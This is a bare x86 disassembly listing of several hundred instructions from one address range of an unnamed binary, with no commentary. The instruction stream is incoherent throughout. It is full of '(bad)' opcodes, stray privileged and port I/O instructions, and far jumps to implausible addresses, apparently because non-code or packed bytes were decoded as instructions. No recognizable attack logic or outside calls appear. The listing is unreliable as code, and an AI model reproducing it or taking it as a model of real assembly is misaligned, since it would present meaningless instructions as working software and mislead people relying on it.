  413f24:	fnsave [esi]
  413f26:	clc    
  413f27:	(bad)  
  413f29:	out    0xc6,eax
  413f2b:	xor    DWORD PTR [esi+eax*1-0x6],edi
  413f2f:	in     al,0xc0
  413f31:	or     BYTE PTR [ebx],dl
  413f33:	js     0x413ed8
  413f35:	push   ds
  413f36:	mov    ecx,0x62d62ac4
  413f3b:	dec    ecx
  413f3c:	mov    edi,0x693f53a9
  413f41:	push   eax
  413f42:	pop    ss
  413f43:	pushf  
  413f44:	xor    BYTE PTR [esi-0x708835ee],0x40
  413f4b:	out    dx,al
  413f4c:	push   cs
  413f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f4e:	jmp    0xc1885698
  413f53:	clc    
  413f54:	jle    0x413f64
  413f56:	adc    al,0x63
  413f58:	fmul   QWORD PTR [edi-0x584705eb]
  413f5e:	rcr    BYTE PTR [esi],0x8d
  413f61:	ds retf 
  413f63:	fnstenv [esi-0x68]
  413f66:	fdivrp st(0),st
  413f68:	fwait
  413f69:	lea    ebp,[edx]
  413f6b:	cs pushf 
  413f6d:	pop    eax
  413f6e:	sar    bl,0xec
  413f71:	es aaa 
  413f73:	mov    dl,0xe5
  413f75:	push   gs
  413f77:	(bad)  [edi+0x7a83b86e]
  413f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f7e:	dec    esi
  413f7f:	push   0xffffffb7
  413f81:	xlat   BYTE PTR ds:[ebx]
  413f82:	add    al,0xae
  413f84:	loop   0x413fa7
  413f86:	lods   al,BYTE PTR ds:[esi]
  413f87:	push   0xfffffff7
  413f89:	std    
  413f8a:	mov    edx,0x6d4f7fdf
  413f8f:	and    ah,ch
  413f91:	jb     0x413fa1
  413f93:	cli    
  413f94:	ja     0x413f9a
  413f96:	adc    DWORD PTR [ecx-0x5e],0xffffff91
  413f9a:	mov    ebx,0x14f18770
  413f9f:	or     al,0x94
  413fa1:	test   DWORD PTR [edx+esi*2],eax
  413fa4:	or     bh,ah
  413fa6:	iret   
  413fa7:	xchg   esi,eax
  413fa8:	loopne 0x413f2a
  413faa:	inc    eax
  413fab:	(bad)  
  413fad:	daa    
  413fae:	push   ebp
  413faf:	addr16 xor al,0xff
  413fb2:	xchg   edx,eax
  413fb3:	clc    
  413fb4:	mov    BYTE PTR [ebx],bh
  413fb6:	leave  
  413fb7:	arpl   ax,sp
  413fb9:	les    edi,FWORD PTR [ebx+edx*4+0x64]
  413fbd:	call   0xd435:0x21a2165
  413fc4:	pop    edx
  413fc5:	push   0x6a8725b8
  413fca:	push   ebp
  413fcb:	and    edx,DWORD PTR [ecx-0x395064a0]
  413fd1:	call   0xafc:0x2ce83ec0
  413fd8:	adc    ebp,DWORD PTR [ecx]
  413fda:	cwde   
  413fdb:	push   ebx
  413fdc:	dec    ecx
  413fdd:	or     edx,ebx
  413fdf:	daa    
  413fe0:	leave  
  413fe1:	fimul  DWORD PTR [edx+0x2a]
  413fe4:	mov    WORD PTR [ecx+0x66],fs
  413fe7:	mov    WORD PTR [ecx+0x55c8d20b],es
  413fed:	mov    ebx,0xbe3513a0
  413ff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ff3:	push   eax
  413ff4:	jge    0x41404a
  413ff6:	mov    cl,ah
  413ff8:	xor    eax,0x8d05fa47
  413ffd:	leave  
  413ffe:	mov    esp,0xa8d46838
  414003:	and    ebx,edx
  414005:	jae    0x414032
  414007:	inc    edi
  414008:	mov    al,bl
  41400a:	push   ebp
  41400b:	or     al,0xf0
  41400d:	mov    dh,0x9d
  41400f:	mov    edi,0x217e4480
  414014:	mov    bh,0xdf
  414016:	cmc    
  414017:	int3   
  414018:	and    eax,0x513d0ef8
  41401d:	adc    DWORD PTR [ecx-0x7e],ecx
  414020:	sti    
  414021:	xchg   edi,eax
  414022:	mov    esi,0x575fd214
  414027:	mov    bh,0xab
  414029:	dec    eax
  41402a:	cwde   
  41402b:	fcomp  DWORD PTR [esp+esi*4]
  41402e:	adc    edi,edi
  414030:	sbb    DWORD PTR [ebp+0x42],eax
  414033:	lahf   
  414034:	rcl    DWORD PTR [ebx+0x12],cl
  414037:	adc    bh,BYTE PTR [ebx-0xd]
  41403a:	and    bl,bl
  41403c:	jl     0x41405c
  41403e:	mov    al,ds:0xca8204a6
  414043:	mov    eax,ds:0x12bb62a7
  414048:	imul   ebx,DWORD PTR [esi-0x1d],0xef057df8
  41404f:	xor    dl,BYTE PTR [ecx]
  414051:	or     bl,cl
  414053:	adc    BYTE PTR [ecx-0x80],al
  414056:	sub    DWORD PTR [ecx],0x5a3f9795
  41405c:	jo     0x4140c3
  41405e:	in     al,dx
  41405f:	cld    
  414060:	and    cl,BYTE PTR [edi+0x44]
  414063:	ret    
  414064:	(bad)  
  414065:	xor    BYTE PTR [esp+ecx*8+0x783e219d],bl
  41406c:	sub    edx,edx
  41406e:	push   0xffffff8c
  414070:	sbb    DWORD PTR [ebx],esi
  414072:	call   0xa28c311c
  414077:	pop    es
  414078:	mov    ecx,0x7f9dd0a8
  41407d:	jecxz  0x414084
  41407f:	mov    eax,ds:0x624e7415
  414084:	out    dx,al
  414085:	jnp    0x41403a
  414087:	(bad)  
  414088:	(bad)  
  414089:	scas   eax,DWORD PTR es:[edi]
  41408a:	fcom   DWORD PTR [edi-0xcbc373d]
  414090:	cmc    
  414091:	in     eax,0x41
  414093:	or     edx,eax
  414095:	pop    ebp
  414096:	jecxz  0x4140ba
  414098:	mov    ch,0x50
  41409a:	fldcw  WORD PTR [ebp+0x164aac28]
  4140a0:	sub    ecx,DWORD PTR [ebx+ecx*8-0x670b8538]
  4140a7:	jl     0x4140f5
  4140a9:	xchg   edx,eax
  4140aa:	lock push esp
  4140ac:	jno    0x41411b
  4140ae:	cmp    BYTE PTR [esi],ch
  4140b0:	adc    al,0x4b
  4140b2:	mov    eax,ds:0x37cc22f7
  4140b7:	and    BYTE PTR [ebx+0x706a2a03],bl
  4140bd:	and    al,0x76
  4140bf:	pop    eax
  4140c0:	push   eax
  4140c1:	sub    eax,0x1949ce33
  4140c6:	add    bh,BYTE PTR [ecx]
  4140c8:	push   ebx
  4140c9:	xchg   DWORD PTR [eax-0x48],edi
  4140cc:	mov    ebp,0x96b39c8a
  4140d1:	add    DWORD PTR [eax-0xb44e21e],ebx
  4140d7:	mov    bl,BYTE PTR [ebp+0x67]
  4140da:	lods   eax,DWORD PTR ds:[esi]
  4140db:	mov    WORD PTR [edx],fs
  4140dd:	clc    
  4140de:	mov    WORD PTR [ebx-0x627ddda7],fs
  4140e4:	xchg   esi,eax
  4140e5:	adc    al,0xdc
  4140e7:	xor    eax,0x2a321c2f
  4140ec:	mov    bl,0x87
  4140ee:	ds shl dh,1
  4140f1:	aaa    
  4140f2:	push   es
  4140f3:	fstp   DWORD PTR [eax-0x7e4488b5]
  4140f9:	push   edx
  4140fa:	imul   esp
  4140fc:	xchg   edx,eax
  4140fd:	xlat   BYTE PTR ds:[ebx]
  4140fe:	pop    ds
  4140ff:	js     0x414143
  414101:	aas    
  414102:	test   al,0x89
  414104:	jecxz  0x414159
  414106:	dec    eax
  414107:	add    eax,0xda02434d
  41410c:	push   esp
  41410d:	fstp   DWORD PTR [ecx+0x65b0eda2]
  414113:	jmp    0x4140af
  414115:	inc    edx
  414116:	(bad)  
  414117:	fs push ecx
  414119:	leave  
  41411a:	mov    cl,0x38
  41411c:	inc    ebx
  41411d:	idiv   DWORD PTR [esi-0x79f7b773]
  414123:	lea    ecx,[edi+0x358a70b3]
  414129:	xchg   ebx,eax
  41412a:	adc    eax,0x497e40bc
  41412f:	dec    ecx
  414130:	fidiv  DWORD PTR [edx+ebp*4-0x384ae618]
  414137:	dec    edi
  414138:	mov    eax,0x20a66126
  41413d:	jp     0x4140f7
  41413f:	mov    bh,0xf4
  414141:	in     al,0x9e
  414143:	jo     0xf52d01fd
  414149:	and    bl,BYTE PTR [esi+0x1e48b98c]
  41414f:	daa    
  414150:	cmp    DWORD PTR [edi+0xf130622],esp
  414156:	sahf   
  414157:	add    ebp,DWORD PTR [ecx+ecx*4-0x6095ee26]
  41415e:	pop    ds
  41415f:	add    eax,0x528a1eaf
  414164:	or     ch,BYTE PTR [ebx]
  414166:	bound  edx,QWORD PTR [ebx+0x5c]
  414169:	test   eax,0x469f56b7
  41416e:	xor    DWORD PTR [edx-0x15],edx
  414171:	mov    DWORD PTR [edx+0x687356b3],0x2617016d
  41417b:	push   ecx
  41417c:	rcl    BYTE PTR [eax+0x20],1
  41417f:	xchg   bl,bh
  414181:	loop   0x41418b
  414183:	mov    dh,0x74
  414185:	mov    al,0x8e
  414187:	push   edx
  414188:	fmul   st(5),st
  41418a:	stos   DWORD PTR es:[edi],eax
  41418b:	retf   
  41418c:	std    
  41418d:	pop    esi
  41418e:	ins    BYTE PTR es:[edi],dx
  41418f:	inc    ebp
  414190:	xchg   ebp,eax
  414191:	shr    DWORD PTR [ebp+0x77bf2d09],1
  414197:	cmp    eax,0x4818b27d
  41419c:	mov    bl,0xcf
  41419e:	imul   ebx,ecx,0xffffffcb
  4141a1:	dec    edx
  4141a2:	ror    DWORD PTR [ebx],1
  4141a4:	jns    0x4141de
  4141a6:	add    edi,esi
  4141a8:	pushf  
  4141a9:	fisub  DWORD PTR [ebp-0x6d]
  4141ac:	aas    
  4141ad:	mov    al,0xec
  4141af:	dec    edi
  4141b0:	pop    ebp
  4141b1:	int3   
  4141b2:	add    edx,DWORD PTR [ecx-0x24]
  4141b5:	mov    edi,0x870c2a8b
  4141ba:	and    ebx,DWORD PTR [ecx-0x150b442d]
  4141c0:	stc    
  4141c1:	push   0x4a
  4141c3:	xor    al,0x52
  4141c5:	jl     0x414242
  4141c7:	fist   DWORD PTR [eax-0x36]
  4141ca:	sub    BYTE PTR [edi],0xd4
  4141cd:	sub    al,0x1e
  4141cf:	retf   
  4141d0:	dec    ecx
  4141d1:	rol    BYTE PTR [esi-0x743fdfb5],1
  4141d7:	push   edx
  4141d8:	jecxz  0x4141a3
  4141da:	imul   ebx,edi,0xab5831f0
  4141e0:	and    ebp,edx
  4141e2:	scas   eax,DWORD PTR es:[edi]
  4141e3:	int3   
  4141e4:	add    DWORD PTR [eax+0x44],eax
  4141e7:	push   edi
  4141e8:	(bad)  
  4141e9:	add    ebx,edx
  4141eb:	push   0xffffffe2
  4141ed:	pop    ss
  4141ee:	adc    eax,DWORD PTR [eax-0x18]
  4141f1:	add    eax,DWORD PTR ds:0xaa17108f
  4141f7:	call   0xe76b:0x21724f00
  4141fe:	pop    esp
  4141ff:	or     bl,dh
  414201:	fbld   TBYTE PTR [ebx+edx*8-0x4d]
  414205:	or     BYTE PTR [edx+0x52],bl
  414208:	dec    edi
  414209:	out    dx,eax
  41420a:	mov    cl,0x34
  41420c:	inc    edx
  41420d:	lods   eax,DWORD PTR ds:[esi]
  41420e:	outs   dx,DWORD PTR ds:[esi]
  41420f:	mov    ah,ch
  414211:	jo     0x4141cc
  414213:	adc    ah,dl
  414215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414216:	adc    DWORD PTR [eax+0x5be07851],edi
  41421c:	out    0xa8,eax
  41421e:	lods   eax,DWORD PTR ds:[esi]
  41421f:	inc    esp
  414220:	sub    DWORD PTR ds:[eax],eax
  414223:	xor    al,0xcc
  414225:	sbb    BYTE PTR [ebx],al
  414227:	jmp    0xb619:0x5eecb262
  41422e:	call   0x633266e0
  414233:	mov    esp,0x2cc6f36e
  414238:	mov    BYTE PTR [edi+ecx*4+0x37],0xe6
  41423d:	retf   0x3ba0
  414240:	lea    ecx,[edx]
  414242:	sbb    al,0xcf
  414244:	push   es
  414245:	push   eax
  414246:	xchg   ecx,eax
  414247:	aad    0xeb
  414249:	dec    esi
  41424a:	xor    eax,0x7ddc421e
  41424f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414250:	gs mov ah,0x6c
  414253:	out    dx,eax
  414254:	mov    ebx,0x322ad2b7
  414259:	sub    DWORD PTR [esi+0x48],0x5b
  41425d:	cwde   
  41425e:	scas   al,BYTE PTR es:[edi]
  41425f:	out    dx,eax
  414260:	adc    ch,BYTE PTR [ebx-0x65d94e52]
  414266:	mov    ebp,0xb1691953
  41426b:	retf   0xc13e
  41426e:	adc    BYTE PTR [edx+edi*8+0x217105c4],bl
  414275:	retf   
  414276:	push   esi
  414277:	jbe    0x4142e8
  414279:	or     al,0x4e
  41427b:	mov    WORD PTR es:[edx+0x1c],cs
  41427f:	push   esi
  414280:	mov    ecx,0x64399200
  414285:	pop    esi
  414286:	je     0x4142f8
  414288:	jp     0x4142e7
  41428a:	jno    0x414297
  41428c:	cmp    esi,eax
  41428e:	cmc    
  41428f:	pop    esi
  414290:	xchg   ebp,eax
  414291:	enter  0x99e3,0xa5
  414295:	lea    esp,[ebx+0x62]
  414298:	arpl   ax,cx
  41429a:	mov    ecx,0xc8c5f801
  41429f:	daa    
  4142a0:	lock push esp
  4142a2:	and    al,0xdc
  4142a4:	mov    edi,0xce94d74
  4142a9:	adc    BYTE PTR [esi-0x2c1a7f93],dl
  4142af:	xchg   edi,eax
  4142b0:	iret   
  4142b1:	fucomp st(3)
  4142b3:	leave  
  4142b4:	cmp    DWORD PTR [ebx],ecx
  4142b6:	xor    edx,ebp
  4142b8:	fdiv   DWORD PTR [ebp+0x63b98c86]
  4142be:	or     DWORD PTR [edi-0x38],esi
  4142c1:	scas   eax,DWORD PTR es:[edi]
  4142c2:	push   0x99d43972
  4142c7:	test   al,0x4f
  4142c9:	nop
  4142ca:	pop    edx
  4142cb:	jmp    0xd771f265
  4142d0:	fwait
  4142d1:	jb     0x4142f3
  4142d3:	mov    ebx,0x134e0736
  4142d8:	lods   eax,DWORD PTR fs:[esi]
  4142da:	aad    0x8b
  4142dc:	cmp    al,0x96
  4142de:	mov    dl,0x4d
  4142e0:	bound  esp,QWORD PTR [ebx+0x1e8a5e8c]
  4142e6:	mov    ch,0xc
  4142e8:	mov    ecx,0x50737374
  4142ed:	fimul  WORD PTR [edx]
  4142ef:	sbb    BYTE PTR [edx],ch
  4142f1:	sar    DWORD PTR [ebx+0x25],1
  4142f4:	sbb    BYTE PTR fs:[ebp-0x38],al
  4142f8:	jecxz  0x41432b
  4142fa:	dec    eax
  4142fb:	std    
  4142fc:	pop    ecx
  4142fd:	push   es
  4142fe:	aam    0xe8
  414300:	push   ds
  414301:	es mov ebp,0x25ca8ec4
  414307:	scas   al,BYTE PTR es:[edi]
  414308:	xchg   ecx,eax
  414309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41430a:	and    edx,DWORD PTR [ebx]
  41430c:	dec    BYTE PTR [ebp+eiz*1-0x15]
  414310:	dec    eax
  414311:	jg     0xd4499cf2
  414317:	pop    ss
  414318:	mov    ebp,0x54245039
  41431d:	add    edi,DWORD PTR [edx+0x1]
  414320:	push   cs
  414321:	std    
  414322:	add    eax,0xf74cd7b
  414327:	and    BYTE PTR [edi],dl
  414329:	jnp    0x4143a5
  41432b:	inc    ebp
  41432c:	sub    al,0x9
  41432e:	push   edx
  41432f:	push   ebp
  414330:	sub    DWORD PTR [ecx+0x53],esp
  414333:	mov    bl,0x78
  414335:	test   al,0x85
  414337:	dec    edx
  414338:	jbe    0x4142ee
  41433a:	jb     0x414373
  41433c:	jne    0x4142d4
  41433e:	out    dx,al
  41433f:	lock mov ds:0x7b8f3302,eax
  414345:	pop    ds
  414346:	repnz or dl,BYTE PTR [eax+0x69]
  41434a:	fisub  WORD PTR [ebx]
  41434c:	mov    ah,0xee
  41434e:	jmp    0x4143c2
  414350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414351:	mov    ebx,DWORD PTR [ebp+0x58]
  414354:	call   0xca837cb0
  414359:	iret   
  41435a:	adc    DWORD PTR [ebx+0x37c8d8c3],esp
  414360:	fsub   QWORD PTR [esi-0x627419cd]
  414366:	adc    DWORD PTR [edx-0x11],0x23391c9c
  41436d:	inc    ebx
  41436e:	call   0x9395abb3
  414373:	inc    esi
  414374:	les    ebp,FWORD PTR [esi-0x741160fa]
  41437a:	mov    BYTE PTR [ebp-0x63],ah
  41437d:	dec    ebx
  41437e:	pop    esp
  41437f:	cmc    
  414380:	adc    esi,DWORD PTR [ecx-0x20e911ae]
  414386:	ror    ebx,cl
  414388:	outs   dx,DWORD PTR ds:[esi]
  414389:	loop   0x41433a
  41438b:	imul   BYTE PTR [ecx]
  41438d:	mov    ebx,0x326b9484
  414392:	ror    DWORD PTR [edi],1
  414394:	jmp    DWORD PTR [eax+0x72]
  414397:	(bad)  
  414398:	fadd   QWORD PTR [edi+0x312eaab5]
  41439e:	pop    esp
  41439f:	test   al,0x6e
  4143a1:	cmc    
  4143a2:	push   cs
  4143a3:	and    BYTE PTR [eax-0x4b],dh
  4143a6:	fdivr  QWORD PTR [ecx-0x4e]
  4143a9:	js     0x4143dd
  4143ab:	in     eax,dx
  4143ac:	lock dec edx
  4143ae:	into   
  4143af:	or     dl,al
  4143b1:	cmp    DWORD PTR [edi+ebx*2-0x62d47f41],edx
  4143b8:	out    0x8,al
  4143ba:	jo     0x41442f
  4143bc:	pop    edi
  4143bd:	iret   
  4143be:	ret    0x11f1
  4143c1:	bound  ebp,QWORD PTR [edi+0x5f4a54eb]
  4143c7:	jmp    0x41443e
  4143c9:	popa   
  4143ca:	scas   al,BYTE PTR es:[edi]
  4143cb:	lds    eax,FWORD PTR [esi+0x2ad8fcfe]
  4143d1:	jb     0x4143d7
  4143d3:	(bad)  
  4143d4:	mov    WORD PTR [ecx],?
  4143d6:	push   esp
  4143d7:	(bad)  [ebx+0x317c1b7e]
  4143dd:	xchg   edx,eax
  4143de:	lds    esp,FWORD PTR [edx+0x6c86535f]
  4143e4:	jmp    0x926d:0x3d5919c2
  4143eb:	lods   al,BYTE PTR ds:[esi]
  4143ec:	imul   ecx,DWORD PTR [edx],0xfffffffc
  4143ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143f0:	into   
  4143f1:	scas   al,BYTE PTR es:[edi]
  4143f2:	or     DWORD PTR [ebx],ebx
  4143f4:	lock jno 0x4143b6
  4143f7:	xor    BYTE PTR [ebp+0x37],ah
  4143fa:	jl     0x4143d3
  4143fc:	or     DWORD PTR [ebp-0x6b],ebx
  4143ff:	mov    al,0x7f
  414401:	sahf   
  414402:	mov    al,0x95
  414404:	in     eax,dx
  414405:	push   cs
  414406:	push   es
  414407:	dec    esi
  414408:	pop    ss
  414409:	in     eax,0x2c
  41440b:	xchg   BYTE PTR [esi-0x65],dh
  41440e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41440f:	push   edx
  414410:	push   cs
  414411:	mov    bh,0x52
  414413:	or     esp,DWORD PTR [ecx]
  414415:	pop    eax
  414416:	cdq    
  414417:	pushf  
  414418:	or     DWORD PTR [ebx],0x3f
  41441b:	jbe    0x41448f
  41441d:	and    DWORD PTR [esi],edx
  41441f:	adc    ch,BYTE PTR [esp+ebp*8+0x41]
  414423:	test   DWORD PTR [eax+0x283a4813],edi
  414429:	pop    ecx
  41442a:	retf   0x8288
  41442d:	jo     0x41442b
  41442f:	adc    al,0x9e
  414431:	jae    0x41449c
  414433:	ja     0x414415
  414435:	idiv   ebp
  414437:	daa    
  414438:	iret   
  414439:	fistp  WORD PTR [esi]
  41443b:	dec    esi
  41443c:	sub    DWORD PTR [esi+0x1a0de20],esp
  414442:	or     edi,ecx
  414444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414445:	xor    BYTE PTR [ecx],0x4a
  414448:	jecxz  0x41446c
  41444a:	dec    esi
  41444b:	mov    edi,DWORD PTR [ecx-0x37]
  41444e:	(bad)  
  41444f:	jbe    0x41446a
  414451:	imul   ebp,edi,0x50
  414454:	fcmovnu st,st(3)
  414456:	ficomp DWORD PTR [esi-0x7d]
  414459:	ret    0xf5b4
  41445c:	push   ss
  41445d:	pop    esp
  41445e:	sub    esp,DWORD PTR ds:0xb263613f
  414464:	(bad)  
  414465:	outs   dx,BYTE PTR ds:[esi]
  414466:	jb     0x4144cb
  414468:	push   esi
  414469:	jmp    0x3c42:0x82fc0694
  414470:	cld    
  414471:	(bad)  [edx+0x62]
  414474:	icebp  
  414475:	pop    eax
  414476:	rcr    BYTE PTR [ebp-0xd],0xa8
  41447a:	fcmovnu st,st(2)
  41447c:	jo     0x414421
  41447e:	pop    esi
  41447f:	sub    DWORD PTR [ecx],esp
  414481:	add    eax,0x9f28085
  414486:	fisub  WORD PTR [ebp-0x7b]
  414489:	pop    edi
  41448a:	cs xor ecx,ebp
  41448d:	and    al,BYTE PTR [ecx+0xc]
  414490:	lds    ebp,FWORD PTR [esi-0x7405cea5]
  414496:	mov    edi,DWORD PTR [ebx+0x5aedc61e]
  41449c:	rcl    BYTE PTR [eax],0x22
  41449f:	fwait
  4144a0:	dec    esp
  4144a1:	xor    eax,0x119f60b4
  4144a6:	sbb    eax,0xb3a3038d
  4144ab:	adc    eax,0xa80301b6
  4144b0:	or     edx,DWORD PTR [ecx]
  4144b2:	cmp    eax,0x22ddbcb4
  4144b7:	rcr    DWORD PTR [edx-0x1ea1606c],cl
  4144bd:	std    
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	cmp    DWORD PTR [esi+0x2b9fd157],edx
  4144c5:	xchg   BYTE PTR [eax+0x454a79a1],bh
  4144cb:	aam    0xdf
  4144cd:	xchg   ecx,eax
  4144ce:	or     BYTE PTR [ecx],bl
  4144d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144d1:	cmp    eax,0x72e89499
  4144d6:	add    al,0x4b
  4144d8:	xlat   BYTE PTR ds:[ebx]
  4144d9:	inc    esp
  4144da:	and    DWORD PTR [eax-0x40],edx
  4144dd:	sub    BYTE PTR [eax-0x3608a2eb],dl
  4144e3:	cmp    eax,0xf218a690
  4144e8:	xchg   DWORD PTR [ebx-0x8],edi
  4144eb:	imul   DWORD PTR [esp+esi*8+0x3b]
  4144ef:	jb     0x4144e8
  4144f1:	sub    edx,DWORD PTR [ecx]
  4144f3:	push   ebp
  4144f4:	ret    
  4144f5:	xchg   edi,eax
  4144f6:	add    BYTE PTR [ebp+0x41852d2],0xc2
  4144fd:	mov    ds:0xf112723e,eax
  414502:	inc    ebp
  414503:	cmp    al,0xc5
  414505:	mov    ebp,DWORD PTR [esi+esi*8+0x7f]
  414509:	mov    bl,ah
  41450b:	into   
  41450c:	ret    0xeaf2
  41450f:	xor    ah,BYTE PTR [eax-0x62082436]
  414515:	jp     0x414558
  414517:	sahf   
  414518:	xchg   edx,eax
  414519:	clc    
  41451a:	cmp    eax,0x1c23a759
  41451f:	das    
  414520:	inc    ecx
  414521:	or     BYTE PTR fs:[eax-0x14990156],dl
  414528:	xchg   esp,eax
  414529:	push   es
  41452a:	scas   al,BYTE PTR es:[edi]
  41452b:	jmp    0x4f0a3c1f
  414530:	mul    DWORD PTR [esi-0x41e6f3c5]
  414536:	mov    edi,0xa7228ff3
  41453b:	sbb    al,0xc2
  41453d:	mov    bh,0x32
  41453f:	enter  0x9c84,0xbb
  414543:	push   cs
  414544:	and    eax,0x5a709407
  414549:	sub    al,0x73
  41454b:	add    dl,BYTE PTR [eax]
  41454d:	jb     0x4144fc
  41454f:	or     ecx,DWORD PTR [eax+eax*8]
  414552:	jmp    0xe4e2c4cf
  414557:	xor    eax,0xb356bd23
  41455c:	clc    
  41455d:	aam    0x13
  41455f:	je     0x414517
  414561:	sub    DWORD PTR [eiz*2-0x1e7ce101],edi
  414568:	jnp    0x41450a
  41456a:	or     DWORD PTR [edx+eiz*4+0x2d],ebx
  41456e:	xor    eax,0x7ca2edff
  414573:	enter  0xf15e,0xaa
  414577:	xor    al,0x9a
  414579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41457a:	add    eax,esp
  41457c:	mov    dl,0x1b
  41457e:	std    
  41457f:	xchg   ebx,eax
  414580:	dec    edx
  414581:	mov    WORD PTR [edi+eiz*4+0x5fbd1a86],es
  414588:	push   cs
  414589:	(bad)  
  41458a:	in     al,0xef
  41458c:	jo     0x4145e8
  41458e:	test   al,0x8e
  414590:	daa    
  414591:	in     eax,dx
  414592:	xor    DWORD PTR [eax-0xba532ef],edi
  414598:	mov    dl,BYTE PTR [ebp-0x2b]
  41459b:	push   edx
  41459c:	jl     0x414564
  41459e:	cdq    
  41459f:	jecxz  0x41455f
  4145a1:	cli    
  4145a2:	dec    ecx
  4145a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145a4:	sbb    al,0x1c
  4145a6:	mov    ch,ch
  4145a8:	shr    BYTE PTR ss:[esi+0xae22c59],1
  4145af:	out    dx,eax
  4145b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145b1:	pop    ebx
  4145b2:	sbb    BYTE PTR [edx-0x5e],dl
  4145b5:	(bad)
  4145b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ba:	pop    ds
  4145bb:	or     eax,0x7b08077
  4145c0:	cmp    BYTE PTR [ebp-0x564a9448],ah
  4145c6:	adc    dl,BYTE PTR [ebx]
  4145c8:	adc    al,0xa2
  4145ca:	push   0x26d5a1c4
  4145cf:	mov    ebp,0xb7152b33
  4145d4:	scas   al,BYTE PTR es:[edi]
  4145d5:	mov    al,0x22
  4145d7:	ja     0x41457a
  4145d9:	adc    al,0xdc
  4145db:	dec    esi
  4145dc:	adc    ecx,DWORD PTR [eax-0x2a]
  4145df:	test   eax,0xd40bed9f
  4145e4:	xchg   edi,eax
  4145e5:	jl     0x414623
  4145e7:	aam    0x50
  4145e9:	mov    ah,0xcc
  4145eb:	jne    0x4145e5
  4145ed:	jno    0x41464e
  4145ef:	ficomp WORD PTR [edx-0xc]
  4145f2:	add    DWORD PTR [esi-0x53f7eda2],edx
  4145f8:	push   eax
  4145f9:	in     al,dx
  4145fa:	loop   0x41464c
  4145fc:	les    edi,FWORD PTR [ebx+0x59]
  4145ff:	add    BYTE PTR [ecx+0x69],dl
  414602:	or     DWORD PTR [eax+ebp*8-0x7150bb28],edi
  414609:	mov    esp,0x7cfd5c40
  41460f:	rcr    BYTE PTR [edx+ebx*8],0x46
  414613:	dec    ecx
  414614:	popa   
  414615:	fwait
  414616:	outs   dx,BYTE PTR ds:[esi]
  414617:	xlat   BYTE PTR ds:[ebx]
  414618:	popa   
  414619:	idiv   BYTE PTR [ebp+0x72f4bf2a]
  41461f:	sbb    BYTE PTR [edx-0x1d],al
  414622:	xchg   esi,eax
  414623:	mov    ebp,0x7f072bc9
  414628:	xchg   ebp,eax
  414629:	mov    dl,al
  41462b:	dec    edi
  41462c:	pop    ss
  41462d:	sbb    al,0x2b
  41462f:	sar    BYTE PTR [esi+0x5b],cl
  414632:	call   0x20c:0x27aea67f
  414639:	push   eax
  41463a:	lods   eax,DWORD PTR ds:[esi]
  41463b:	ins    DWORD PTR es:[edi],dx
  41463c:	popw   ss
  41463e:	mov    esi,0xb9dc94bf
  414643:	imul   eax,DWORD PTR [esp+ecx*8],0x6f
  414647:	mov    dh,0x12
  414649:	je     0x4145cd
  41464b:	fs xchg esp,eax
  41464d:	(bad)  
  41464e:	pop    ss
  41464f:	push   ebp
  414650:	fisttp QWORD PTR [ebx-0x7f]
  414653:	test   BYTE PTR [ecx],dh
  414655:	shrd   DWORD PTR [esi-0x56],ecx,0x8f
  41465a:	push   esi
  41465b:	adc    ebx,0xfffffff3
  41465e:	mov    edi,0x65de009c
  414663:	push   eax
  414664:	pusha  
  414665:	fsubrp st(4),st
  414667:	push   0xffffffbd
  414669:	sub    BYTE PTR [edx+0x50],dl
  41466c:	or     eax,0xcc228704
  414671:	rcl    eax,1
  414673:	or     eax,0xc4c3d04f
  414678:	pop    DWORD PTR [ecx+ecx*8]
  41467b:	and    DWORD PTR [ebx],edi
  41467d:	pushf  
  41467e:	les    esi,FWORD PTR [bx+di]
  414681:	pop    ss
  414682:	jg     0x41464c
  414684:	mov    dh,0x1c
  414686:	call   0xaceca5d4
  41468b:	movntps XMMWORD PTR [edi],xmm2
  41468e:	int3   
  41468f:	leave  
  414690:	retf   
  414691:	mov    ebx,0x726f377c
  414696:	sub    bl,BYTE PTR es:[edi+0x7d4a4802]
  41469d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41469e:	sub    al,0x20
  4146a0:	cmp    ecx,DWORD PTR ds:0x4272870
  4146a6:	mov    ebp,0x4b881df7
  4146ab:	jmp    0xf7e0:0xf62cc5e8
  4146b2:	xor    dh,BYTE PTR [ebp-0x6]
  4146b5:	call   0x74ff5947
  4146ba:	nop
  4146bb:	mov    BYTE PTR cs:[esi+0x72],bh
  4146bf:	sub    eax,0xb9b2bc5f
  4146c4:	jmp    0x41469c
  4146c6:	scas   al,BYTE PTR es:[edi]
  4146c7:	xlat   BYTE PTR ds:[ebx]
  4146c8:	(bad)
  4146cb:	push   ss
  4146cc:	lds    dx,DWORD PTR es:0xd35c2db9
  4146d4:	enter  0xae95,0x77
  4146d8:	adc    edi,ebx
  4146da:	pop    es
  4146db:	add    DWORD PTR [edx],0x2fd134f9
  4146e1:	pop    ss
  4146e2:	mov    ds:0x1ba3d4a8,ax
  4146e8:	(bad)  
  4146ea:	sbb    edx,DWORD PTR [ebx+0x37]
  4146ed:	jl     0x4146de
  4146ef:	std    
  4146f0:	jg     0x41474f
  4146f2:	mov    ch,0x7
  4146f4:	jnp    0x4146f1
  4146f6:	dec    edi
  4146f7:	icebp  
  4146f8:	aad    0xc8
  4146fa:	mov    edi,0xa3101ffd
  4146ff:	loopne 0x4146f1
  414701:	cmp    eax,0xaaf4a84a
  414706:	ror    DWORD PTR [esi],1
  414708:	xchg   bh,bl
